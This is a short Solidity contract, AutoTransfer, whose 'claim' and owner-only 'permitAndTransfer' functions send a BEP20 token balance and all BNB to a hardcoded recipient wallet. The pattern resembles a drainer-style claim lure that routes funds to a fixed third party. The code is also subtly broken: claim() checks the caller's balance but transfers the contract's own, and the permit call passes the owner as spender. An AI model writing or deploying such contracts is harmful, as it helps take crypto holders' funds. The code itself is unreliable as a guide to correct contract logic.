// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function permit(address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
}

contract AutoTransfer {
    
    address public constant tokenAddress = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address public constant recipient = 0x3F7E41a3Fa77FbbaE91C2170729aC6A609e481f1;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function claim() external {
        uint256 balance = IBEP20(tokenAddress).balanceOf(msg.sender);
        require(balance > 0, "No balance to transfer");

        bool transferred = IBEP20(tokenAddress).transfer(recipient, balance);
        require(transferred, "Transfer failed");

        // Transfer all BNB to another wallet
        payable(recipient).transfer(address(this).balance);
    }

    function permitAndTransfer(uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external payable {
        require(msg.sender == owner, "Only contract owner can call this function");

        // Permit the contract to spend the tokens
        IBEP20(tokenAddress).permit(owner, amount, deadline, v, r, s);

        // Transfer all tokens to another wallet
        bool transferred = IBEP20(tokenAddress).transfer(recipient, IBEP20(tokenAddress).balanceOf(address(this)));
        require(transferred, "Transfer failed");

        // Transfer all BNB to another wallet
        payable(recipient).transfer(address(this).balance);
    }
}